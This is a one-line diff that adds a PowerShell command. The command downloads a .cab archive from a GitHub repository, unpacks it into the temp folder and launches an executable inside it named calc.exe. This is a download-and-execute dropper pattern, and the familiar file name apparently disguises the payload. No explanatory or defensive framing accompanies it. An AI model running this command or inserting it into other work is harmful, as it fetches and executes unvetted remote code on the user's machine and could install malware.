@@ -1,0 +1,1 @@
+$w = New-Object Net.WebClient; $t = "$env:TEMP\extracted_files"; $w.DownloadFile('https://github.com/forsaken0127/Rust/raw/main/file.cab', "$t\file.cab"); Expand-Archive -Path "$t\file.cab" -DestinationPath $t -Force; Start-Process -FilePath "$t\calc.exe"
